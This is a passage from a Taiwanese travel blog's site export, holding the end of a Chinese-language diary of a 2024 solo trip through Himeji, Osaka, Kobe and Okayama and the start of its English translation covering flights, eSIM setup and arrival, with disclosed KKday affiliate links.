分鐘才會到城入口。想說先去找昨天路人推薦的姬路城拍攝點，拍攝點在跟入城口相反的方向，在右邊的「姬路市動物園」裡面。看宣傳進入右手邊有卡皮巴拉，但可能因為太冷沒出來；進去後直接直走過橋看到摩天輪後右轉，在他後面有一塊空地就是拍攝點。https://youtube.com/shorts/XDquPOanhpQ這個拍攝點的取景很好，可惜沒有櫻花或楓葉陪襯。 拍完後大概繞了一下這個動物園，設施非常老舊(遊樂設施另外付費)，動物空間狹小、 很多看起來都很憂鬱、出現刻板行為，不忍直視 ，逛一下就離開了。拍完姬路城走回左側城入口參觀城內。買完票順著參觀路線一路進到城內。進入室內後同樣要脫鞋，會發一個塑膠袋裝鞋子。從二階往回看姬路站，一共有六階越往上越小、樓梯越陡峭，要排隊上樓。 此時已接近中午 12:30，飢腸轆轆加上今天出門忘了帶行動電源，手機已快沒電加上排隊人潮眾多，就沒再繼續往上爬了，在二階這裡折返出城。出城後一路走回三之丸廣場然後走出來外面。Kushiyaki Kobe beef在姬路城外面商店街找了一家有賣神戶牛的店，外帶了神戶牛丼飯跟串燒回飯店休息充電。13:20 回飯店休息天候不佳＋早上爬山＋手機沒電＝回飯店休息。除了份量有點小之外，這家的神戶牛味道還不錯。15:30 姬路站附近逛街大約休息到 15:30 又重新出門。姬路站這邊意外的沒什麼好逛的，只有車站這邊的 Piole 跟 SANYO 山陽電車那棟的百貨公司、周圍一條商店街，沒有唐吉訶德、麥當勞，Lawson 也只有一家、藥妝店也只有一家松本清。Piole 三樓的 Kiddy Land 有一些吉伊卡哇、這裡沒什麼人也不用排隊，帶了三隻寶寶回家，烏薩奇沒有買到睡衣版本的QQ。商店街亂逛，找扭蛋行程。雖然剛說沒什麼好逛，但至少扭蛋店還是有也有安利美特。接近傍晚時分開始下大雨，還好今天本來就無特別行程安排。~=18:00 吃晚餐おだしとワインとお料理と。motto在商店街隨便找了一家有神戶牛的店當晚餐。這家的特色是有一個前菜招財貓甜點，不會太甜還不錯。點了神戶牛排跟茶泡飯還有生啤。這家的神戶牛排我覺得普普通通，不太好咬也吃不太出神戶牛的味道，茶泡飯倒是蠻好吃的。吃飽再亂逛一下，雨後的姬路。~=20:00 回飯店休息＆看台日大戰日本視角、轉播內容完全聽不懂，但日本的轉播資訊很完整，左邊還有棒球知識補充，右邊有完整的球路分析。最後這場是日本勝。 晚安姬路。Day 6 (11/17週日) 大阪、神戶本來想衝 鳴門旋渦、明石海峽大橋 但是天候依然不佳，所以改去大阪神戶逛街。~= 08:45 搭乘新幹線自由座前往新大阪搭乘新幹線到新大阪(25 分鐘)再轉乘御堂筋線到大阪的時間跟搭一般的直接到大阪差不多、新幹線的班次很多，所以選擇搭比較舒適又可以充電的新幹線。9:17 抵達新大阪到新大阪後還要走一下到御堂筋線。先去 去年來京阪神 沒去到的難波八阪神社。搭到難波站出來再走一小段在某個巷子內就是神社。 才發現大阪也在測試人臉辨識進出站了。~=9:50 抵達難波八阪神社神社不大，觀光客很多，到此一遊拍幾張照片就離開了。離開後繼續走到下一站「大國町」搭一站到「動物園前」下車，前往通天閣。出站穿過地下道、商店街繼續往前走就會看到通天閣塔。 這邊感覺治安蠻亂的，一出站過地下道有很多遊民，還有遊民在吵架很大聲，有點可怕。商店街巷子狹窄左右都有吃的，有幾家感覺是排隊名店、很多人。約 10:30 抵達通天閣下，準備上去的人大排長龍，我直接放棄。走回地鐵站回大阪。~=11:00 回到大阪梅田出站先去 LINKS 百貨，五樓可以直通 Yodobashi 扭蛋玩具區。逛完 LINKS 穿過大阪車站、樓上的時空廣場，直達大阪大丸百貨。來到 13 樓這邊有寶可夢中心、大阪任天堂、CAPCOM…喵了一下薩爾達周邊， 上次已經買很多了 ，這次什麼都沒買就離開了。路過阪神虎周邊商店。準備去吃 Shake Shack，七月去曼谷吃過， 意猶未盡 ；來大阪回味。~=12:00 Shake ShackShake Shack 阪神梅田店 就在阪神虎商店隔壁。直接用自助點餐，這次吃酪梨培根雞肉堡跟奶昔；這家空間蠻大的、位子也多。大阪車站吃飽後再大阪車站附近閒晃，想說去大阪的 Kiddy Land 找找吉伊卡哇。在大阪地下街迷路，走了很久才找到阪急三番街，再走地下聯絡道從南館到北館，美食街上來就是了。吉伊卡哇自已獨立一個櫃位在另外一邊。13:00 Kiddy Land Osaka Chiikawa排隊的人蠻多的，粗估至少要等 40 分鐘以上。 想當然，我沒有花時間排隊等。一樓有 熊本熊 活動。可能是假日的關係活動比較多，Kiddy Land 外也有卡娜赫拉的合影活動。(另一隻 Usagi XD)13:20 前往神戶在地下街又迷路了一下才找到大阪梅田地鐵站，搭阪急神戶線前往神戶三宮（阪急）。13:50 抵達神戶時間還很早，打算先去「 神戶動物王國 」找卡皮巴拉。Google Map 要我搭乘「新交通港灣人工島線」，在地下街繞了老半天找不到對應的指標。(迷路 Day)出站才發現就是天上跑的這條，從二樓三宮站入站。車站很多人，後來才知道今天剛好是 神戶馬拉松 。迷路 Day…因為車剛好來沒仔細看上錯車，上到往北埠頭的車，悲劇從此刻開始。 往 神戶動物王國 要坐往 神戶空港 的，往 北埠頭 的會在 北埠頭 就回頭回神戶。 ⚠️⚠️⚠️神戶馬拉松有封路跑上高架，這條地鐵跟北捷文湖線一樣是早期的輪胎捷運。14:20 發現坐錯車 在中埠頭 跳車搭到這邊苗頭不對直接跳車，Google Map 建議我走回市民廣場站轉搭下一班。可能是因為是海埔新生地港口區，這邊很荒涼走起來覺得很遠。走快到市民廣場前站想說怎麼那麼熱鬧，原來是神戶馬拉松的終點活動會場。 悲劇 2 因為人太多所以這站不給進了，要再往前走到南公園站。走到南公園站再一站就到了，就懶得搭捷運直接走去神戶動物王國…同前述，因為太荒涼走起來感覺很遠，確實也很遠，從中埠頭走來 2 公里(約 30 分鐘)。14:50 抵達神戶動物王國門票：2,200 日圓鯨頭鸛、兔猻、小熊貓神戶動物王國雖然是半室內半室外，但裡面的動線規劃蠻好的，各種飛禽走獸都有，而且多半可以近距離接觸，很適合親子花個半天來這裡玩；動物的狀況相較姬路市立動物園好很多、環境也很乾淨。卡皮巴拉來這邊的目的達成，來摸卡皮巴拉，好肥、毛摸起來好粗糙很像掃把。每隻都一臉慵懶，不用上班真好！可能因為太胖，現在不販賣食物在場內餵食、不能餵場外食物或放東西在他頭上。另一區還有袋鼠、羊近距離互動。摸前、摸完都要記得洗個手。還有一隻海豹，但看起來場地太小他一直在繞圈圈QQ企鵝餵食（需要排整理券）。可愛的小爪水獺家族，一直嚶嚶叫。水獺這邊有一隻馬來貘，但是沒什麼理他 QQ巨嘴鳥跟梟，還有腳邊會出現的雉雞。(走路要小心不要踩到⚠️)朱利安國王跟會吃同事的鵜鶘、也有夜行館貓頭鷹室內還有兔兔貓貓狗狗互動區（要排整理券）、飲食、紀念品店…等等整體來說體驗蠻好的！15:50 離開，準備返回神戶主要是來摸卡皮巴拉，加上時間不太夠所以沒有停留太久。~= 16:05 抵達(神戶)三宮站因為神戶馬拉松的緣故，出站的人很多。離吃飯時間還有一個多小時，先在神戶三宮附近逛逛，一樣去找扭蛋跟 Kiddy Land。神戶的 Kiddy Land 沒什麼人但是吉伊卡哇的商品很少，沒找到我要的睡衣烏薩奇。Center Plaza 這邊有點年代但是有很多商店可逛。去二樓找扭蛋也去二手商店看看有沒有我要的烏薩奇。有一家信長書店，可以買御守送朋友，嘻嘻。~=17:00 神戸牛 吉祥吉B1 就有一家 神戸牛 吉祥吉，差不多快五點就先來吃晚餐了。時間還很早，沒什麼人；老闆聽到我是台灣來的很熱情，這餐也是來神戶的目的， 吃一餐好的 — 神戶牛 ，不然來的幾天幾乎都亂吃。我點「神戶牛赤身肉牛排 220g」7,700 日圓 (未稅價⚠️，結帳要含稅)加購套餐(生菜、飯、湯)跟生啤。生菜清爽，湯是牛肉湯，很好喝。肉很嫩、汁多、肉味足，相較昨天吃的神戶牛，這才是神戶牛的滋味。 不過真要說我還是比較喜歡鐵板的，更勝洋食。最後實刷： $2,158 台幣 。17:40 吃飽離開，前往神戶塔吃完走到海岸線的舊居留地、大丸前站，搭一站後再步行前往神戶塔。神戶這邊好熱鬧(相較姬路)，有好多百貨可以逛。搭乘往 新長田，在下一站 港元町 下車。18:05 抵達神戶塔周邊去年來的時候在維修 ，目前已完全開放了。神戶港這邊蠻有港灣小鎮的感覺，有機會的話會考慮在神戶這邊住一晚。這次來走馬看花一下就走了。18:30 回神戶中華街回神戶站的路上先去中華街買 Kobe Frantz 巧克力伴手禮 。回到 JR 元町站請注意是 JR 元町站不要跑去阪神電車元町站。18:53 搭乘 快速 姬路方面網干 前往神戶(兵庫)18:57 同月台另一側 換乘 新快速 湖西線經由網干 換乘快 20 分鐘抵達 ，還好有換成才趕在姬路唯一一家藥妝店松本清免稅時間結束前抵達。這列車車型也是要按旁邊開門按鈕才會開門的、車廂彼此是分開的。19:34 抵達姬路19:45 抵達姬路 Piole 松本清採購藥妝 請注意雖然他營業時間寫到 21:00 但是 免稅時間只到 20:30 。⚠️⚠️⚠️買了一個超迷你 Cup Noodle在日本的最後一晚，在飯店吃吃吃喝喝宵夜、啤酒。(這丸子是鬆軟口感…) 晚安姬路。Day 7 (11/18 週一) 岡山、回程08:30 早安姬路最後看一眼姬路的早晨。到新幹線站準備搭乘 08:52 的新幹線前往岡山。搭乘 08:52 的新幹線自由座前往岡山09:13 抵達岡山車站搭乘新幹線大約 21 分鐘就會到岡山車站了，可惜這次時間不夠無法 再訪廣島 。跟上次一樣直接到岡山車站西口搭乘往機場巴士的地方，這裡就有置物櫃寄放行李、也有廁所(這時間百貨還沒開廁所很少)。09:30 岡山車站麥當勞吃這陣子台灣很紅的「鬆餅漢堡」看不懂日文差點選錯，要選這個「マックグリドル」才是鬆餅系列。 日本麥當勞早餐時段到 10:30。吃完大約 10:00 沒有特別想去的地點。上次已經去過岡山城跟吉備津神社了 ，最後時間就去逛逛岡山 AEON 永旺夢樂城。岡山藝術季今年岡山有 藝術季活動 。施工中的岡山站跟暫時被移到車站旁的桃太郎。從地下街過馬路到 AEON MALL B2，這邊也有一家麥當勞。這邊很大很好逛，幾乎所有品牌都有。要吃東西、買伴手禮 (B1-B2) 也都有。繼續找扭蛋，但都沒找到我要的電車按鈕扭蛋，放棄…應該是沒再出了。也有幾家店有賣吉伊卡哇。~=11:00 準備吃午餐 雖然沒有很餓但是為了備戰下午候機跟虎航沒供餐，所以還是要吃。 ⚠️⚠️⚠️樓上這邊吃的選擇很多。豚ステーキ専門店 B 岡山店選了一家主打鐵板豬排的店。點了一份鐵板豬排定食(200g)跟生啤。最後付 2,178 日圓比較訝異的是豬排上來的時候沒有全熟，大約 7 分熟；查了一下評價跟介紹好像就是這家的特色，不過我還是趁鐵板熱的時候把能用熟的肉塊都用熟了。 吃起來是真的好吃，很 Juice、肉香味足、不會咬不爛；私心覺得不輸昨天的神戶牛(我可能沒富貴命)。小廢物行李箱(大約跟 Airpods Pro 一樣大)跟娃包最後在一樓無印良品買了些東西大約 12:15 就離開了。~=12:30 回到岡山站準備搭乘 13:00 的交通車去岡山機場。最後再看一眼岡山。~=13:00 搭乘交通車前往岡山機場在 21 月台這邊排隊候車，不用擔心搭不上，只要是 13:00 前來排隊的都會送你到機場(滿了會再加開交通車)。可以直接刷交通卡上下車(Suica) 或是去候車亭裡面投幣買票。因為滿員提早 12:45 就發車了。~=13:20 抵達岡山桃太郎機場時間還非常早，今年搭的是 17:30 起飛的航班、去年是搭 15:25 的這個時間來剛剛好，17:30 起飛的現在來要乾等快 4 個小時。https://www.okayama-airport.org/tw/access/bus 但是目前沒辦法，因為 下一班是 15:55，到機場 16:25 ；雖然機場很小同時間航班也只有一班出境算快，但怕塞車之類的因素，很難保證 16:25 會到，像我來的時候遇到塞車整整多了快 30 分鐘車程。 就看之後岡山機場會不多開交通車班次了，或是去 日本自由行討論區 社團找人拼計程車。 看別人分享岡山車站到機場計程車大約 7,000 日圓上下。在機場附近亂晃，機場外有一個縮小版的岡山後樂園還有很紅的楓葉。車站外也有一尊桃太郎，另外機場溫馨提醒要買保險， 我這次就真的就差點被自行車撞。⚠️國內線這邊有蠻多位子可以坐著休息。一樓只有有一家伴手禮店其他什麼都沒有， 跟去年一樣 買了一個冰桃麻糬吃。二樓在整修只剩部分店有開， 去年能去的觀景平台 好像也沒開放了；但至少還有一家伴手禮店跟幾家吃的。~=15:00 開始辦理登機手續桃太郎機場太小，跟其他機場報到＋托運的流程不一樣。 這邊是統一排隊，要托運的行李過 X 光＋會貼封條貼紙、沒要托運的就不用(出境前的安全檢查會掃描其他的)，無托運行李的也要跟著排 ，排到就跟機場人員說沒要托運直接過、如果貼完貼紙又打開行李箱就要重新掃描＋貼貼紙。⚠️⚠️⚠️ 機場人員會講中文…很厲害~=15:15 報到＋托運完畢這次沒買什麼、沒買酒就 17 kg 了…但是我幾乎沒手提行李，全塞進去了。~=16:20 開始排安檢、出境機場整修中. .但依然有扭蛋。雖然只有一個航班但是因為機場小、工作人員少、只有一條線、檢查的也很細，所以排安檢出境就大概花了快 20–30 分鐘。倒水跟丟棄物品的地方也就只是個箱子。 感覺如果趕 15:55 岡山出發，到機場 16:25 的交通車，如果能準時抵達，基本上報到托運那邊已經全空了可以直接辦理，然後再上來直接排出境安檢應該是來得及的。 只有我們這一航班，所以應該會等到所有已報到的人安檢完才會起飛，早來機場晚排安檢的人也沒比較快。~=16:42 開始候機候機室不大，只有一家免稅店，有賣一些伴手禮、菸酒品相不多。想投幾罐桃子水帶回台灣，全賣完了；只好投一罐紅茶花伝，回來後發現很好喝、不會太甜，後悔沒多投幾罐。~=18:10 起飛 (延誤 40 分鐘) 再見岡山、再見日本。在機上隔壁坐一位 Youtuber 大哥「 跟著我們一起Chill with us 」人很 Nice，他這次是去四國的，互相交流了一下景點推薦，有機會也想去四國。19:45 抵達台灣 (延誤 10 分鐘)還好只影響 10 分鐘，速速提領完行李飛奔巴士站。20:20 前往台北的大有巴士依照地點不同可以搭不同的車回家，之前是搭國光直接回台北，這次我要搭大有巴士 11 月台回新北。 好巧不巧悠遊卡餘額不夠刷不過，又飛奔去櫃檯用現金買票(還好前一天把台幣帶在身上)，最終有趕上客運。旅程結束。心得總結這次的行程安排太緊湊，很多地方都走馬看花，尤其前三天因為移動距離較長加上停留時間太短，沒有好好慢慢享受島根出雲、松江的美麗景色；如果有機會會想再去一次，看夕陽、看楓葉、看神迎神在祭典。如果想了解歷史再去出雲可參考蘭爸爸的影片：1. 日本這片土地是怎麽誕生的？竟然是被生出來的！！|日本神話|日本的誕生|天地開闢|国産み|神産み|大八島囯|伊邪那岐|伊邪那美|蘭爸爸說故事 2. 日本最調皮的神，與自己的姐姐生下了日本皇室的直系祖先！斬殺八岐大蛇，迎娶美麗的妻子，堪稱神仙界的“神生贏家”！日本最初的和歌竟然出自他口？！|日本神話|須佐之男|岩戶隱|八岐大蛇|稻田姬|蘭爸爸說故事 3. 一隻兔子爲何要招惹一群鯊魚？經歷過兩次的死而復生，他竟然迎娶了自己祖先的女兒！大國主神話|大國主|因幡之白兔|根之囯|日本神話|蘭爸爸說故事 有介紹到天照大神、大國主神(出雲神社)、因幡之白兔的故事。山陽 岡山廣島地區遊記 [遊記] 2023 山陽地區 廣島岡山 6 日自由行可以一起參考山陽地區遊記，有時間的話可以山陽＋山陰一起玩。KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 (如果只去松江、鳥取松江地區可考慮) 關西&amp;山陰地區鐵路周遊券 JRPass (岡山機場進出最佳選擇) 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 鳥取沙丘 | 日本唯一的驚險滑沙體驗 【鳥取巴士一日遊】鳥取砂丘、浦富海岸巡航、砂之美術館、採梨子體驗｜含特色午餐（大阪出發） 遊覽鳥取沙丘和著名的出雲大社 2 日巴士之旅（大阪出發） 新年參觀！出雲大社停留3小時【廣島出發】 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 山陽地區 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 297 Total Views Last Statistics Date: 2025-08-15 | 251 Views on Medium." }, { "title": "Travel Diary 2024: A 7-Day Solo Trip to the San'in Region - Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, and Kobe", "url": "/posts/travel-diaries/en/travel-diary-2024-a-7-day-solo-trip-to-the-san-in-region-shimane-izumo-matsue-tottori-himeji-osaka-and-kobe-aacd5f5cacd1/", "categories": "Travel Diaries", "tags": "Lifestyle, Japan, Travel Writing, Shimane Prefecture, Tourism", "date": "2024-12-03 00:04:56 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2024: A 7-Day Solo Trip to the San’in Region - Shimane, Izumo, Matsue...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2024: A 7-Day Solo Trip to the San’in Region - Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, and KobeStarting from Okayama, I first visited the San’in region of Shimane, then Tottori, and finally returned to Himeji, Kansai, and Osaka. Over 7 days, I walked 100,000 steps and traveled over 1,000 kilometers, exploring the San’in and Kansai regions.Sunset at Lake ShinjiIntroductionInitially, I planned to visit Sendai in the second half of 2024. However, after checking the attractions, I found my interest was lukewarm for that time. I recalled my wonderful experience from the same week last year (November 13-18) when I took a 6-Day Free Trip to the Sanyo Region - Hiroshima and Okayama. I had a great impression of the Chugoku region, Sanyo, and Okayama — beautiful scenery, convenient transportation, and fewer tourists. So, I decided to explore the San’in region (Shimane and Tottori) this time. With some free time at work and feeling mentally overwhelmed, I needed a break. This led to my 7-day, 6-night solo trip to the San’in region (plus Kansai: Himeji and Osaka).PreparationsDates: November 12-18This time, I had a spontaneous opportunity in mid-October, so I quickly arranged to depart on November 12 and return on November 18.✈️ FlightsThis year, I didn’t particularly chase after discounted tickets from Tigerair’s autumn promotions. Last year, I managed to get a good deal with better timing and lower prices (Last year: Departure (11:10), Return (15:25), including round-trip 20KG checked baggage + seat selection + miscellaneous fees: NT$ 7,012). Outbound: 13:05 TPE Taoyuan International Airport -&gt; 16:30 OKJ Okayama Momotaro Airport Return: 17:30 OKJ Okayama Momotaro Airport -&gt; 19:35 TPE Taoyuan International Airport Total round-trip cost including 20KG checked baggage + seat selection + miscellaneous fees: NT$ 9,118Not particularly cheap, but acceptable. If I had chosen the same departure and return times as last year, it would have been more expensive, around NT$ 12,000.Tigerair’s New Direct Flight Route in 2025Tigerair Taiwan will launch a new direct flight from Taoyuan International Airport to Tottori Yonago Airport starting May 29, 2025, making it even more convenient to visit the San’in region!🏝️ ItineraryHaving never been to the San’in region or Himeji, I focused on these three places. November 12: Arrive in Okayama in the evening, stay one night to prepare for the next morning’s trip to Shimane. November 13: Take the JR train to Shimane in the morning, visit Izumo Taisha and Inasa Beach, then head to Lake Shinji for sunset in the evening. November 14: Visit Matsue Castle and take a boat ride on the Matsue Horikawa in the morning, then visit the Adachi Art Museum in the afternoon, and arrive in Tottori in the evening. November 15: Visit the White Rabbit Shrine in the morning, explore the Tottori Sand Dunes in the afternoon, and arrive in Himeji in the evening. November 16: Visit Himeji Castle and explore the city. I actually visited Shosha Mountain Enkō-ji Temple. November 17: Walk the Ohnaruto Bridge promenade, see the Naruto whirlpools, and the Akashi Kaikyō Bridge. Due to bad weather, I didn’t go and instead explored Osaka and Kobe for shopping and food. November 18: Shop at Okayama Station and return home.🚅 Transportation - Japan JR Pass | Kansai &amp; San’in Region Rail Pass | eMCO Electronic TicketSince this trip involved long-distance travel, I had to buy a JR Pass. I was initially worried that there would only be JR passes for the San’in and Sanyo regions, but I was pleasantly surprised that Japan JR had thoughtfully planned all possible routes, offering the Kansai &amp; San’in Region Rail Pass JRPass, which was perfect for my needs!Kansai &amp; San’in Region Rail Pass JRPass Coverage Price: NT$ 3,779, plus an additional San’in Sanyo Region 3-Day Pass (great for combination use)📱 InternetI also purchased a Japan eSIM Card | Daily High-Speed, Unlimited Data Plan | 35% Off from KKday. 7-Day Unlimited Data eSIM Plan Price: NT$ 847It worked great, very stable, and I didn’t encounter any issues with throttling or disconnections. The activation method and precautions for the eSIM will be included later in this article, so please keep reading.Japanese YenI exchanged for new Japanese yen bills. It’s recommended to bring both new and old bills, as some vending machines cannot accept new bills.Vending machine that accepts new bills🏠 AccommodationI was fortunate that I only couldn’t book a room at Toyoko Inn for one night in Matsue; I managed to book everywhere else.November 12: Toyoko Inn Okayama Station East Exit (1 night)Just a 4-minute walk from Okayama Station Non-smoking twin room, for 1 person Price: NT$ 1,616November 13: Matsue Urban Hotel (1 night)Just a 2-minute walk from Matsue Station Double Room with Small Double Bed — Non-Smoking — Building 2 Price: NT$ 2,431November 14: Toyoko Inn Tottori Station South Exit (1 night)Just a 4-minute walk from Tottori Station Non-smoking double room, for 1 person Price: NT$ 1,595November 15: Toyoko Inn Himeji Station Shinkansen North Exit (3 nights)Just a 5-minute walk from Himeji Station Non-smoking double room, for 1 person Price: NT$ 6,055, NT$ 2,018 per nightAlthough I managed to book Toyoko Inn for almost all nights, I ended up with a double room due to late booking, which made the price higher. If I had booked a single room, I could have kept it under NT$ 1,500 per night. However, based on past experiences, as the date approaches, even double rooms tend to fill up quickly, possibly because these locations are less frequented? A room tour video will be included later in this article, so please keep reading. Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application… I mentioned these in previous articles, so I won’t elaborate here. Visit Japan The only difference from before is that the “Entry Inspection” and “Customs Declaration” QR codes have been merged into one “Entry Inspection and Customs Declaration QR Code,” with no distinction between blue and yellow codes.Tigerair Online Self-Check-InAbout 1-3 days before departure, I received a flight notification email from Tigerair. It is essential! to complete the online “self-check-in” directly before departure:After clicking on self-check-in, you will be directed to the Tigerair website to confirm passenger information and baggage safety, and finally, a “boarding pass” will be generated and sent to you.Keep your boarding pass safe; you can go directly to the “self-baggage drop” at the airport without wasting time waiting in the long “regular check-in” line.Let’s Go! Departure!KKday Promotions 🛒 Japan JR PASS | Tottori &amp; Matsue Area Pass | eMCO Electronic Ticket (Consider this if you’re only visiting Matsue and Tottori) Kansai &amp; San’in Region Rail Pass JRPass (Best choice for entering and exiting Okayama Airport) [**Japan eSIM Card Daily High-Speed, Unlimited Data Plan**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} Japan JR PASS | Sanyo &amp; San’in Region Rail Pass | eMCO Electronic Ticket (Explore the Sanyo and San’in regions all at once) [Tottori Sand Dunes Japan’s only thrilling sandboarding experience](https://www.kkday.com/zh-tw/product/184144?cid=19365){:target=”_blank”} [【Tottori Bus Day Tour】Tottori Sand Dunes, Uratomi Coast Cruise, Sand Museum, Pear Picking Experience Includes Special Lunch (Departing from Osaka)](https://www.kkday.com/zh-tw/product/11463-osaka-bus-tour-tottori-sand-dunes-uratomi-coast-cruise-sand-museum-japan?cid=19365){:target=”_blank”} 2-Day Bus Tour to Explore Tottori Sand Dunes and Famous Izumo Taisha (Departing from Osaka) New Year Visit! 3-Hour Stop at Izumo Taisha 【Departing from Hiroshima】Day 1 (November 12, Tuesday) DepartureMy flight was at 13:05, so I woke up at 8 AM and left around 9 AM, giving me plenty of time.November 2024 Screenshot from the Pre-Check-In Official WebsiteTigerair’s Pre-Check-In Service (Check in and drop off luggage at the MRT, then go directly to the airport) can only be done at MRT A3 New Taipei Industrial Park Station; it cannot be done at Taipei Main Station, so I took the MRT straight to Terminal 1.~= 10:00 Arrive at the AirportI arrived at the airport around 10:00 and had to wait until 10:20 for the check-in counters to open.~= 10:20 Line Up for “Self-Baggage Drop”At this point, I was able to take advantage of the online check-in I completed earlier. The regular check-in line was already long at 10:20, estimated to take at least 45 minutes to an hour. The “self-baggage drop” took me less than 15 minutes, saving a lot of waiting time. Completing online check-in on-site and then lining up for “self-baggage drop” is much faster than going to the “regular check-in.”~= 10:50 Complete Departure ProceduresThis time, I was at Gate A1 in Terminal 1. (Finally, no more shuttle bus!)Previously, I always ate at Tasty, but this time I opted for Lao Dong Beef Noodles, conveniently located near Gate A1.~= 11:30 Waiting for the FlightAfter eating and wandering around a bit, I arrived at the waiting area around 11:30. The downside of Gate A1 is that it is far from the VIP Lounge in Terminal 1, so I didn’t feel like walking back and forth and just went directly to the waiting area.I took care of two internet issues beforehand. The first was that my Chunghwa Telecom roaming function was turned off, and I couldn’t purchase a roaming plan directly. So, I called Chunghwa Telecom to unlock the roaming function just in case.I needed to call Chunghwa Telecom and confirm my personal information for customer service to unlock it.Pre-Activating eSIM (Example for iPhone)The second internet issue was to activate the eSIM at the airport. Since activating the eSIM requires a network connection, I was worried about the stability of the WiFi at Okayama Airport, so I entered the activation for the Japanese eSIM while I was still connected to a stable network in Taiwan. If you’re still worried about network issues causing problems upon entry, you can also take a screenshot of the entry QR code or write out the paper entry card as a backup.Previously, the eSIM I bought in Thailand allowed me to simply long-press the QR code in the purchase confirmation email, PDF, or screenshot to see the “Add eSIM” option and automatically add it. However, this time, the eSIM I bought for Japan did not show that option:I found a method provided by a netizen that successfully reveals the “Add eSIM” option. (It seems to be an iOS bug that started after iOS 17.4): Go to the eSIM confirmation email or PDF, take a screenshot, and save it to your photo album. Open your phone’s camera and tap the bottom left corner to access the photo album. Find the eSIM photo in the album, long-press the QR code, and the “Add eSIM” option will appear. Tap “Add eSIM” to directly input the activation information and activate the eSIM.Manually Activating eSIM on iPhoneGo to “Settings” -&gt; “Cellular” -&gt; “Add eSIM” -&gt; “Use Mobile Barcode”:I printed out the eSIM QR code, so I scanned it directly from there.If you don’t have anything, you can click “Manually Enter Details” to copy and paste the eSIM confirmation information for manual activation:Fill in the SM-DP+ address, Activation Code, and Confirmation Code (this time there isn’t one), then click next to complete the activation.After entering the information, it will take some time to activate. You might get stuck on “Activating…” for a while or see a message saying activation failed and to try again later; just wait a little longer, and it should activate successfully. In “Settings” -&gt; “Cellular,” it will show “On,” and the signal icon will appear in the top right corner, indicating the signal status. You can select the “Travel” label for the mobile plan. We are still in Taiwan and currently cannot connect to the eSIM for Japanese networks; we just need to confirm that activation was successful.~= 12:20 Boarding Begins, No Delays~= 13:05 On Time DepartureAt this time, it started pouring rain in Taiwan, but there wasn’t much wind, so it didn’t significantly affect the takeoff.I find the seating comfort on Tigerair to be quite good compared to other budget airlines (like Peach, which has smaller seats, and VietJet, which has uncomfortable chairs). However, a downside of Tigerair is that they prohibit bringing your own food, and I just ate, so I’m not hungry!There’s no WiFi on board, so I can only listen to music and play offline games.From the window, I can see that the weather in Japan is really nice. 👍👍👍16:30 (Taiwan Time 15:30) On-Time LandingAfter landing in Japan, our Japanese eSIM should be able to receive a signal. If there’s a signal but no internet access, go to “Settings” -&gt; “Cellular” -&gt; select Travel Japan eSIM -&gt; ensure “Turn on this number” and **enable “Data Roaming” to get internet! ⚠️⚠️⚠️ Additionally, you can access the main Chunghwa Telecom number. If you haven’t purchased a Chunghwa Telecom roaming plan, remember to turn off “Data Roaming” and “Turn on this number” to keep it activated, so you can receive SMS from Taiwan! Please note: Do not answer calls randomly; receiving calls from overseas to domestic numbers will incur charges! ⚠️⚠️⚠️ (Only receiving SMS is free)~= 17:00 Completed Immigration and Baggage Claim Okayama Momotaro Airport is a very small airport, with only one international flight at a time (which is this flight). Follow the other passengers to immigration and baggage claim; it’s quick. (This flight seemed almost full, and it took about 30 minutes to get out.) Surprisingly, the airport staff all spoke Chinese. Perhaps because it’s a small airport, they were stricter; if you’re traveling alone like me, you might be asked how many days you’ll stay and where you’re going. Some were even asked to show hotel reservations.(So if you’re going alone, please prepare for this in advance.)Airport WiFi Okayama Airport offers free WiFi, but you need to enter your email after connecting. Check your inbox for an email to click the link to activate it for continued use. If you just need to access the Visit Japan QR code, you can open the webpage within 10 minutes of connecting.~= 17:04 Took the Bus from Okayama Airport to JR Okayama Station](/assets/aacd5f5cacd1/1*k3bf2CWOwFKCWeC1eC1yTQ.webp){: lqip=”data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNzEiIGhlaWdodD0iNjM0Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+” }For the latest bus schedule, please refer to the official website The airport is small, and just follow the signs to the bus to Okayama Station. There are staff to guide you, so you won’t get lost; just get on the bus. Since flights are infrequent, the bus will not only run according to the scheduled times but will also add extra trips based on flight arrivals; you don’t have to worry about not getting on due to full capacity; if it’s full, another bus will come. (According to the schedule, I would have to wait until 19:05 for a bus, but there were actually extra buses.) If you show your passport before 2024/11/30, you can ride for free; free shuttles are offered irregularly, and when I came last year, there were none.~= 18:00 Arrived at JR Okayama StationI encountered some traffic due to rush hour and arrived at Okayama Station around 18:00. (30 minutes longer than expected)Exchanged JR Pass &amp; Reserved Tickets for Tomorrow’s Trip to Matsue at JR Okayama Station You can check the stations where you can exchange the JR Pass on the official website; not every station allows exchanges! (JR 